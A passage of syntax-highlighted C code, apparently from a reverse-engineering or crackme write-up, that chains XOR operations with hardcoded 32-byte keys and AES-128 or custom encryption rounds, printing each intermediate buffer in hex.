class="number">0xbb</span>,<span class="number">0x3d</span>,<span class="number">0xe9</span>,<span class="number">0x7f</span>,<span class="number">0x44</span>,<span class="number">0x35</span>,<span class="number">0x6e</span>,<span class="number">0x89</span>,<span class="number">0xc2</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey7[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input, input);</span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey8[]&#123; <span class="number">0x0c</span>,<span class="number">0x1d</span>,<span class="number">0x7d</span>,<span class="number">0xd2</span>,<span class="number">0xef</span>,<span class="number">0x8e</span>,<span class="number">0xb5</span>,<span class="number">0x48</span>,<span class="number">0x3b</span>,<span class="number">0x00</span>,<span class="number">0xfe</span>,<span class="number">0xfa</span>,<span class="number">0xf9</span>,<span class="number">0x54</span>,<span class="number">0xc6</span>,<span class="number">0x45</span>,<span class="number">0xed</span>,<span class="number">0x67</span>,<span class="number">0x00</span>,<span class="number">0x12</span>,<span class="number">0x3f</span>,<span class="number">0x9e</span>,<span class="number">0x96</span>,<span class="number">0x48</span>,<span class="number">0x2f</span>,<span class="number">0x9f</span>,<span class="number">0x91</span>,<span class="number">0x0f</span>,<span class="number">0x86</span>,<span class="number">0x6d</span>,<span class="number">0x40</span>,<span class="number">0xc6</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey8[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey9[]&#123; <span class="number">0xb6</span>,<span class="number">0x79</span>,<span class="number">0xcd</span>,<span class="number">0x35</span>,<span class="number">0xa6</span>,<span class="number">0x21</span>,<span class="number">0x21</span>,<span class="number">0x0c</span>,<span class="number">0x88</span>,<span class="number">0x61</span>,<span class="number">0xe7</span>,<span class="number">0xe5</span>,<span class="number">0x6d</span>,<span class="number">0xc9</span>,<span class="number">0x55</span>,<span class="number">0x49</span>,<span class="number">0xa4</span>,<span class="number">0x54</span>,<span class="number">0x85</span>,<span class="number">0x43</span>,<span class="number">0x98</span>,<span class="number">0x8e</span>,<span class="number">0x68</span>,<span class="number">0x3f</span>,<span class="number">0xdd</span>,<span class="number">0x57</span>,<span class="number">0xa5</span>,<span class="number">0xf1</span>,<span class="number">0xbd</span>,<span class="number">0xc8</span>,<span class="number">0x81</span>,<span class="number">0x85</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey9[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey10[]&#123; <span class="number">0x1b</span>,<span class="number">0x2f</span>,<span class="number">0x4f</span>,<span class="number">0x5e</span>,<span class="number">0x44</span>,<span class="number">0x18</span>,<span class="number">0x2f</span>,<span class="number">0xe1</span>,<span class="number">0x5b</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0x32</span>,<span class="number">0xf6</span>,<span class="number">0xf0</span>,<span class="number">0x6b</span>,<span class="number">0xf9</span>,<span class="number">0x97</span>,<span class="number">0xc9</span>,<span class="number">0x58</span>,<span class="number">0x61</span>,<span class="number">0x0f</span>,<span class="number">0xf4</span>,<span class="number">0xa9</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,<span class="number">0xa3</span>,<span class="number">0x15</span>,<span class="number">0x72</span>,<span class="number">0xa4</span>,<span class="number">0xe9</span>,<span class="number">0x58</span>,<span class="number">0x39</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey10[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input, input);</span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey11[]&#123; <span class="number">0x68</span>,<span class="number">0xf3</span>,<span class="number">0x4a</span>,<span class="number">0xc2</span>,<span class="number">0x00</span>,<span class="number">0x2b</span>,<span class="number">0x8d</span>,<span class="number">0x39</span>,<span class="number">0x64</span>,<span class="number">0x00</span>,<span class="number">0x75</span>,<span class="number">0x00</span>,<span class="number">0xe6</span>,<span class="number">0x32</span>,<span class="number">0xc2</span>,<span class="number">0xb4</span>,<span class="number">0xc4</span>,<span class="number">0x00</span>,<span class="number">0x57</span>,<span class="number">0x3c</span>,<span class="number">0x87</span>,<span class="number">0x00</span>,<span class="number">0x75</span>,<span class="number">0x00</span>,<span class="number">0x94</span>,<span class="number">0x68</span>,<span class="number">0x1c</span>,<span class="number">0x12</span>,<span class="number">0x07</span>,<span class="number">0x00</span>,<span class="number">0xdb</span>,<span class="number">0x09</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey11[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input, input);</span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey12[]&#123; <span class="number">0x00</span>,<span class="number">0x40</span>,<span class="number">0x7f</span>,<span class="number">0xc6</span>,<span class="number">0xd5</span>,<span class="number">0x79</span>,<span class="number">0xa4</span>,<span class="number">0xfb</span>,<span class="number">0xfe</span>,<span class="number">0xa6</span>,<span class="number">0x00</span>,<span class="number">0x32</span>,<span class="number">0xb9</span>,<span class="number">0x6e</span>,<span class="number">0x4f</span>,<span class="number">0xf1</span>,<span class="number">0x62</span>,<span class="number">0xa3</span>,<span class="number">0x00</span>,<span class="number">0x47</span>,<span class="number">0x37</span>,<span class="number">0x4d</span>,<span class="number">0xfd</span>,<span class="number">0x00</span>,<span class="number">0xbe</span>,<span class="number">0x55</span>,<span class="number">0xe2</span>,<span class="number">0x00</span>,<span class="number">0xbe</span>,<span class="number">0x3f</span>,<span class="number">0x00</span>,<span class="number">0xb2</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey12[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey13[]&#123; <span class="number">0x27</span>,<span class="number">0xa1</span>,<span class="number">0xed</span>,<span class="number">0xb3</span>,<span class="number">0x45</span>,<span class="number">0xd5</span>,<span class="number">0x5a</span>,<span class="number">0x87</span>,<span class="number">0x6c</span>,<span class="number">0x0d</span>,<span class="number">0x35</span>,<span class="number">0x76</span>,<span class="number">0x29</span>,<span class="number">0x18</span>,<span class="number">0xb1</span>,<span class="number">0x9c</span>,<span class="number">0x5c</span>,<span class="number">0xe2</span>,<span class="number">0x59</span>,<span class="number">0x08</span>,<span class="number">0xe7</span>,<span class="number">0xe6</span>,<span class="number">0x55</span>,<span class="number">0xce</span>,<span class="number">0x7c</span>,<span class="number">0x6f</span>,<span class="number">0x3c</span>,<span class="number">0x5d</span>,<span class="number">0xee</span>,<span class="number">0xa0</span>,<span class="number">0x73</span>,<span class="number">0x11</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey13[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input, input);</span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey14[]&#123; <span class="number">0x75</span>,<span class="number">0x9a</span>,<span class="number">0x74</span>,<span class="number">0x00</span>,<span class="number">0x7a</span>,<span class="number">0x69</span>,<span class="number">0xae</span>,<span class="number">0xed</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x3a</span>,<span class="number">0x00</span>,<span class="number">0x24</span>,<span class="number">0xaf</span>,<span class="number">0xa3</span>,<span class="number">0x33</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x44</span>,<span class="number">0x21</span>,<span class="number">0x00</span>,<span class="number">0xdc</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x27</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x8a</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey14[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey15[]&#123; <span class="number">0x00</span>,<span class="number">0xd1</span>,<span class="number">0x57</span>,<span class="number">0x00</span>,<span class="number">0x2b</span>,<span class="number">0xf1</span>,<span class="number">0x5e</span>,<span class="number">0xea</span>,<span class="number">0xa4</span>,<span class="number">0x79</span>,<span class="number">0x00</span>,<span class="number">0x2c</span>,<span class="number">0xd8</span>,<span class="number">0x88</span>,<span class="number">0x7c</span>,<span class="number">0x00</span>,<span class="number">0x5a</span>,<span class="number">0x1d</span>,<span class="number">0x00</span>,<span class="number">0xfe</span>,<span class="number">0x00</span>,<span class="number">0xf1</span>,<span class="number">0xbf</span>,<span class="number">0x05</span>,<span class="number">0x55</span>,<span class="number">0xe6</span>,<span class="number">0x82</span>,<span class="number">0x00</span>,<span class="number">0x11</span>,<span class="number">0x00</span>,<span class="number">0xe1</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey15[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input, input);</span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey16[]&#123; <span class="number">0xe9</span>,<span class="number">0x11</span>,<span class="number">0xf0</span>,<span class="number">0x24</span>,<span class="number">0xa1</span>,<span class="number">0x34</span>,<span class="number">0x3a</span>,<span class="number">0xb1</span>,<span class="number">0x1d</span>,<span class="number">0x27</span>,<span class="number">0xda</span>,<span class="number">0xd0</span>,<span class="number">0xe7</span>,<span class="number">0x1f</span>,<span class="number">0x5b</span>,<span class="number">0xbc</span>,<span class="number">0x08</span>,<span class="number">0xde</span>,<span class="number">0xf5</span>,<span class="number">0xab</span>,<span class="number">0x1b</span>,<span class="number">0xca</span>,<span class="number">0x83</span>,<span class="number">0xd7</span>,<span class="number">0xf9</span>,<span class="number">0x52</span>,<span class="number">0xe5</span>,<span class="number">0x3c</span>,<span class="number">0xa0</span>,<span class="number">0xc9</span>,<span class="number">0x0a</span>,<span class="number">0x1a</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey16[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey17[]&#123; <span class="number">0xd3</span>,<span class="number">0xe6</span>,<span class="number">0xcb</span>,<span class="number">0x3a</span>,<span class="number">0x00</span>,<span class="number">0x8b</span>,<span class="number">0x25</span>,<span class="number">0x00</span>,<span class="number">0x75</span>,<span class="number">0xb7</span>,<span class="number">0x24</span>,<span class="number">0x12</span>,<span class="number">0x4b</span>,<span class="number">0xc4</span>,<span class="number">0xbe</span>,<span class="number">0x4e</span>,<span class="number">0x4e</span>,<span class="number">0x7e</span>,<span class="number">0xb7</span>,<span class="number">0xeb</span>,<span class="number">0x02</span>,<span class="number">0xeb</span>,<span class="number">0x2b</span>,<span class="number">0x23</span>,<span class="number">0xac</span>,<span class="number">0x1c</span>,<span class="number">0xf9</span>,<span class="number">0x9f</span>,<span class="number">0x7d</span>,<span class="number">0xbf</span>,<span class="number">0xf9</span>,<span class="number">0xf0</span> &#125;;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey17[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input, input);</span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey18[]&#123; <span class="number">0x2a</span>,<span class="number">0x1a</span>,<span class="number">0x00</span>,<span class="number">0x18</span>,<span class="number">0x8a</span>,<span class="number">0x00</span>,<span class="number">0x36</span>,<span class="number">0x00</span>,<span class="number">0x3d</span>,<span class="number">0x86</span>,<span class="number">0x16</span>,<span class="number">0x9e</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x00</span>,<span class="number">0x92</span>,<span class="number">0xa3</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xb9</span>,<span class="number">0x6b</span>,<span class="number">0x1f</span>,<span class="number">0x41</span>,<span class="number">0xa9</span>,<span class="number">0x00</span>,<span class="number">0xb9</span>,<span class="number">0xa9</span>,<span class="number">0x2b</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey18[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input, input);</span><br><span class="line">    <span class="built_in">aes_encrypt_128</span>(aes_key, input + <span class="number">16</span>, input + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey19[]&#123; <span class="number">0xaa</span>,<span class="number">0xce</span>,<span class="number">0x0d</span>,<span class="number">0xe0</span>,<span class="number">0xd2</span>,<span class="number">0xfb</span>,<span class="number">0xd2</span>,<span class="number">0x12</span>,<span class="number">0xb1</span>,<span class="number">0x11</span>,<span class="number">0xad</span>,<span class="number">0x65</span>,<span class="number">0x0c</span>,<span class="number">0x45</span>,<span class="number">0xf2</span>,<span class="number">0xe0</span>,<span class="number">0x4a</span>,<span class="number">0x1a</span>,<span class="number">0xed</span>,<span class="number">0x47</span>,<span class="number">0x14</span>,<span class="number">0x44</span>,<span class="number">0x59</span>,<span class="number">0xe9</span>,<span class="number">0x61</span>,<span class="number">0xfa</span>,<span class="number">0x09</span>,<span class="number">0xaf</span>,<span class="number">0xa5</span>,<span class="number">0xb0</span>,<span class="number">0x15</span>,<span class="number">0x15</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey19[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey20[]&#123; <span class="number">0xae</span>,<span class="number">0x30</span>,<span class="number">0x50</span>,<span class="number">0x8e</span>,<span class="number">0x8e</span>,<span class="number">0x9e</span>,<span class="number">0x35</span>,<span class="number">0x41</span>,<span class="number">0x7b</span>,<span class="number">0x96</span>,<span class="number">0x56</span>,<span class="number">0x1e</span>,<span class="number">0xe7</span>,<span class="number">0xcc</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0x10</span>,<span class="number">0x59</span>,<span class="number">0xa5</span>,<span class="number">0x62</span>,<span class="number">0xb5</span>,<span class="number">0x57</span>,<span class="number">0xea</span>,<span class="number">0xbc</span>,<span class="number">0x34</span>,<span class="number">0xb7</span>,<span class="number">0xd6</span>,<span class="number">0x0e</span>,<span class="number">0x3a</span>,<span class="number">0x27</span>,<span class="number">0x18</span>,<span class="number">0xb3</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey20[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey21[]&#123; <span class="number">0x5f</span>,<span class="number">0x68</span>,<span class="number">0xf7</span>,<span class="number">0x00</span>,<span class="number">0x1e</span>,<span class="number">0xba</span>,<span class="number">0x00</span>,<span class="number">0x83</span>,<span class="number">0x00</span>,<span class="number">0xad</span>,<span class="number">0x54</span>,<span class="number">0xd0</span>,<span class="number">0x91</span>,<span class="number">0x00</span>,<span class="number">0x79</span>,<span class="number">0xb5</span>,<span class="number">0xd8</span>,<span class="number">0x96</span>,<span class="number">0xed</span>,<span class="number">0x67</span>,<span class="number">0x99</span>,<span class="number">0x6a</span>,<span class="number">0xe0</span>,<span class="number">0x6c</span>,<span class="number">0xad</span>,<span class="number">0xdb</span>,<span class="number">0x5a</span>,<span class="number">0x90</span>,<span class="number">0xea</span>,<span class="number">0xa4</span>,<span class="number">0x6d</span>,<span class="number">0xab</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey21[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey22[]&#123; <span class="number">0x07</span>,<span class="number">0x9f</span>,<span class="number">0x6e</span>,<span class="number">0x23</span>,<span class="number">0x1e</span>,<span class="number">0x88</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xe2</span>,<span class="number">0x99</span>,<span class="number">0x49</span>,<span class="number">0x3f</span>,<span class="number">0x34</span>,<span class="number">0x5e</span>,<span class="number">0x85</span>,<span class="number">0xc9</span>,<span class="number">0xb5</span>,<span class="number">0x06</span>,<span class="number">0x8c</span>,<span class="number">0x4c</span>,<span class="number">0x13</span>,<span class="number">0x4e</span>,<span class="number">0x2f</span>,<span class="number">0x00</span>,<span class="number">0xe1</span>,<span class="number">0xdb</span>,<span class="number">0x47</span>,<span class="number">0xfa</span>,<span class="number">0xba</span>,<span class="number">0x91</span>,<span class="number">0x4c</span>,<span class="number">0xe7</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey22[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey23[]&#123; <span class="number">0x16</span>,<span class="number">0x00</span>,<span class="number">0x2f</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0xd5</span>,<span class="number">0x5b</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x58</span>,<span class="number">0xd0</span>,<span class="number">0xb0</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0x1d</span>,<span class="number">0x39</span>,<span class="number">0xb9</span>,<span class="number">0xa2</span>,<span class="number">0x8d</span>,<span class="number">0x00</span>,<span class="number">0xc5</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x70</span>,<span class="number">0x93</span>,<span class="number">0x95</span>,<span class="number">0x00</span>,<span class="number">0x55</span>,<span class="number">0x6b</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey23[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> xorkey24[]&#123; <span class="number">0xa2</span>,<span class="number">0x00</span>,<span class="number">0xef</span>,<span class="number">0xd2</span>,<span class="number">0x56</span>,<span class="number">0x00</span>,<span class="number">0x14</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x59</span>,<span class="number">0x35</span>,<span class="number">0xd4</span>,<span class="number">0x82</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x1b</span>,<span class="number">0x27</span>,<span class="number">0xaa</span>,<span class="number">0xd8</span>,<span class="number">0x84</span>,<span class="number">0x86</span>,<span class="number">0x8a</span>,<span class="number">0x00</span>,<span class="number">0xf5</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x2d</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0x8f</span>,<span class="number">0xfc</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        input[i] ^= xorkey24[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">encrypt</span>(input);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, input[i]);</span><br><span class="line">    <span 